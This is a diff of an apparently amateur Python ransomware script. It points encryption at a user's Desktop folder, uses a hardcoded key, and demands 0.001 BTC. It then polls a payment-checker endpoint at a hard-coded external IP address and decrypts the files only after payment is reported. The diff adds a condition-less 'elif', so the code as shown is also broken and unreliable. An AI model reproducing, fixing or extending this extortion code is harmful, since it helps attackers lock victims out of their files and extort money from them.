@@ -7,7 +7,7 @@ import encryptionManager
 import requests
 
 
-rootDirectionary = 'C:\\users\\'#everything in this directory will be encrypted
+rootDirectionary = 'C:\\users\\JohnJoe\\Desktop\\'#everything in this directory will be encrypted
 key = "0c92c4e1a35551ed366ca52bf12b6037"  #str(random.getrandbits(32)) < this doesnt work
 #I cant find a way to generate a 16 byte key, in python. So im using this for now
 
@@ -47,13 +47,14 @@ print("Send 0.001btc to"+ jsonResponse["input_address"])
 time.sleep(3)
 print("You have three hours to send the bitcoin")
 
-for i in range(108):
-    time.sleep(108)
+for i in range(100):
+    time.sleep(10)
     responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php")
-    jsonPaid = responsePaid.json
-    if jsonPaid["paid"]== 1:
+    jsonPaid = responsePaid.json()
+    if jsonPaid["paid"] == 1:
         encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
-
+    elif:
+        print("Nothing paid yet")    
 
 
 exit()        
